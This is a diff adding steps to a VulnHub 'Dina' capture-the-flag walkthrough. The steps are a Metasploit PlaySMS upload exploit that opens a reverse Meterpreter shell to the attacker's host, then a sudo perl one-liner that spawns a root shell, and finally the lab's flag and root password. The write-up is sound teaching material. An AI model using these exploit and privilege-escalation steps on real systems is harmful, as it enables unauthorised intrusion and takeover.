@@ -122,6 +122,8 @@ after trying the passwords, i found that i can login with `touhid:diana` :
 
 ![loginpanel](https://github.com/Git-K3rnel/VulnHub/assets/127470407/46c5b8c5-a675-44be-be59-99662a022295)
 
+## 3.Gaining Shell
+
 after a while searching, i found that searchsploit has something with `playsms` panel :
 
 ```bash
@@ -190,13 +192,68 @@ Exploit target:
    --  ----
    0   PlaySMS 1.4
 
+msf6 exploit(multi/http/playsms_uploadcsv_exec) > run
+
+[*] Started reverse TCP handler on 192.168.56.102:4444 
+[+] Authentication successful: touhid:diana
+[*] Sending stage (39927 bytes) to 192.168.56.108
+[*] Meterpreter session 1 opened (192.168.56.102:4444 -> 192.168.56.108:40307) at 2023-10-17 07:05:51 -0400
+
+meterpreter > shell
+Process 2393 created.
+Channel 0 created.
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
+## 4.Privilege Escalation
+
+Checking our sudo permissions :
+
+```bash
+www-data@Dina:/home$ sudo -l
+sudo -l
+Matching Defaults entries for www-data on this host:
+    env_reset,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User www-data may run the following commands on this host:
+    (ALL) NOPASSWD: /usr/bin/perl
+```
+
+yes, we can execute perl binary.
+
+check gtfobins to see how to use perl for PE :
+
+```bash
+www-data@Dina:/home$ sudo perl -e 'exec "/bin/sh";'
+
+# id
+uid=0(root) gid=0(root) groups=0(root)
+
+# cd /root
+# cat flag.txt
+________                                                _________
+\________\--------___       ___         ____----------/_________/
+    \_______\----\\\\\\   //_ _ \\    //////-------/________/
+        \______\----\\|| (( ~|~ )))  ||//------/________/
+            \_____\---\\ ((\ = / ))) //----/_____/
+                 \____\--\_)))  \ _)))---/____/
+                       \__/  (((     (((_/
+                          |  -)))  -  ))
 
 
+root password is : hello@3210
+easy one .....but hard to guess.....
+but i think u dont need root password......
+u already have root shelll....
 
 
+CONGO.........
+FLAG : 22d06624cd604a0626eb5a2992a6f2e6
+```
 
+This is how you can get root on this machine :)
 
 
 
